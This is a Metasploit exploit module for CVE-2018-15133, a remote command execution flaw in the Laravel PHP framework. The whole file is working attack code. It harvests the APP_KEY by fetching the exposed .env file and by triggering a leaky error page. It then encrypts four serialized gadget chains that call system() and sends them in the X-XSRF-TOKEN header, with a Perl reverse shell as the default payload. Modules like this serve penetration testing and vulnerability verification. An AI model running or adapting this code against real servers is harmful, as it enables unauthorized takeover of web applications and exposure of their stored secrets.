##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'PHP Laravel Framework token Unserialize Remote Command Execution',
      'Description' => %q{
       This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29.
       Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to
       an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php.
       Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY.
       Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix.
       In some cases the APP_KEY is leaked which allows for exploitation.
      },
      'DisclosureDate' => 'Aug 07 2018',
      'Author' => [
        'StÃ¥le Pettersen', # Discovery
        'aushack', # msf exploit
      ],
      'References' => [
        ['URL', 'https://github.com/kozmic/laravel-poc-CVE-2018-15133'],
        ['CVE', '2018-15133'],
        ['URL', 'https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30'],
        ['URL', 'https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0']
      ],
      'License' => MSF_LICENSE,
      'Platform' => 'unix',
      'Arch' => ['cmd'],
      'DefaultTarget' => 0,
      'Stance' => Msf::Exploit::Stance::Aggressive,
      'DefaultOptions' => {
        'PAYLOAD' => 'cmd/unix/reverse_perl',
      },
      'Payload' => {
        'DisableNops' => true,
      },
      'Targets' => [[ 'Automatic', {} ]],
    ))

    register_options([
        OptString.new('PATH', [ true, "Path to target webapp", "/index.php"]),
        OptString.new('APP_KEY', [ false, "The base64 encoded APP_KEY string from the .env file", ""]),
        Opt::RPORT(80),
    ])
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => datastore["PATH"],
        'method' => 'GET',
        'headers'   => {
            'Accept-Encoding' => 'identity'
         }
      })
      #vprint_status "Request sent\n#{res.body}\n"
      if res && res.headers && res.headers.to_s =~ /XSRF-TOKEN|laravel_session/i # Can be 'XSRF-TOKEN', 'X-XSRF-TOKEN', 'laravel_session', or $appname_session... and maybe more?

         auth_token = check_appkey()
         if (test_appkey(auth_token) == false)
            return
         else
            if auth_token.blank?
               vprint_status("This module requires a valid APP_KEY to function")
            else
               #vprint_status "FOUND APP_KEY of #{auth_token}\n"
               random_string = Rex::Text.rand_text_alphanumeric(12)

               1.upto(4) do |x|
                  vuln = generate_token("echo #{random_string}", auth_token, x)

                  res = send_request_cgi({
                    'uri' => datastore['PATH'],
                    'method' => 'POST',
                    'headers' => {
                      'X-XSRF-TOKEN' => "#{vuln}",
                    }
                  })

                  if res.body =~ /#{random_string}/
                     return CheckCode::Vulnerable
                  elsif res.body.to_s =~ /Method Not Allowed/ # Not conclusive but witnessed in the wild
                     return CheckCode::Safe
                  end
               end
            end
         end
         return CheckCode::Detected
      end
      rescue Rex::ConnectionError
        return CheckCode::Unknown
    end
  end

  def check_appkey
      ret = false

      if datastore["APP_KEY"].present?
         ret = datastore["APP_KEY"]
      elsif datastore["APP_KEY"].empty?
         vprint_status "No APP_KEY set. Will try to find it..."

         vprint_status "Checking for CVE-2017-16894 .env information leak."

         res = send_request_cgi({
           'uri' => '/.env',
           'method' => 'GET',
           'headers' => {
             'Accept-Encoding' => 'identity'
           }
         })

         if res && res.body =~ /APP_KEY/ # Good but may be other software. Can also check for 'APP_NAME=Laravel' etc
            if res.body =~ /APP_KEY\=base64:(.*)/ # Need the base64 KEY
               str = $1
               vprint_status "APP_KEY Found via CVE-2017-16894 .env information leak: #{str}"
               return str
            else
               vprint_status "Website .env file exists but didn't find a suitable APP_KEY"
            end
         end

         vprint_status "Checking for Laravel Framework information leak."
         # Possible config error / 0day found by aushack during pentest
         # Seen in the wild with recent releases

         res = send_request_cgi({
           'uri' => datastore['PATH'],
           'method' => 'POST',
           'headers' => {
             'X-XSRF-TOKEN' => "#{Rex::Text.rand_text_alpha(1)}",
             'Accept-Encoding' => 'identity'
           }
         })

         if res && res.body =~ /DecryptException/ # Good sign but might be more universal with e.g. 'vendor/laravel/framework' ?
            vprint_status "Laravel Framework throws an error!"
            if res.body =~ /APP_KEY/ # Promising!
               vprint_status "Target appears to be vulnerable"
               if res.body =~ /\>base64:(.*)\<\/span\>/ # Leaks all environment config including passwords for databases, AWS, REDIS, SMTP etc... but only the APP_KEY appears to use base64
                  str = $1
                  vprint_status "APP_KEY Found via Laravel Framework error information leak: #{str}"
                  return str
               end
            end
         end
      end
      return ret
  end

  def test_appkey(value)
      value = Rex::Text.decode_base64(value)
      if value && value.length.to_i == 32
         return true
      else
         vprint_status "Unable to continue: the set datastore APP_KEY value or information leak is invalid."
      end
      return false
  end

  def generate_token(cmd, key, id)
      app_key = key

      case id # Ported phpggc Laravel RCE php objects :)
         when 1
            payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
         when 2
            payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + cmd.length.to_s + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
         when 3
            payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + cmd.length.to_s + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
         when 4
            payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
      end

      cipher = OpenSSL::Cipher.new('AES-256-CBC') # Or AES-128-CBC - untested
      cipher.encrypt
      cipher.key = Rex::Text.decode_base64(app_key)
      iv = cipher.random_iv

      value = cipher.update(payload_decoded) + cipher.final
      pload = Rex::Text.encode_base64(value)
      iv = Rex::Text.encode_base64(iv)
      mac = OpenSSL::HMAC.hexdigest("SHA256", Rex::Text.decode_base64(app_key), iv+pload)
      iv = iv.gsub('/', '\\/') # Escape slash
      pload = pload.gsub('/', '\\/') # Escape slash
      json_value = '{"iv":"' + iv + '","value":"' + pload + '","mac":"' + mac + '"}'
      json_out = Rex::Text.encode_base64(json_value)

      return json_out
  end

  def exploit

      auth_token = check_appkey()
      if (test_appkey(auth_token) == false)
         return
      else
         if auth_token.blank?
            print_status("This module requires a valid APP_KEY to function")
            return
         else
            1.upto(4) do |x|
               sploit = generate_token(payload.encoded, auth_token, x)

               res = send_request_cgi({
                  'uri' => datastore['PATH'],
                  'method' => 'POST',
                  'headers' => {
                     'X-XSRF-TOKEN' => "#{sploit}",
                  }
               })

               break if session_created? # Stop when one of the deserialization attacks works.

               if res && res.body =~ /The MAC is invalid|Method Not Allowed/ # Not conclusive
                  print_status "Target appears to be patched or otherwise immune."
               end
            end
         end
      end
   end
end
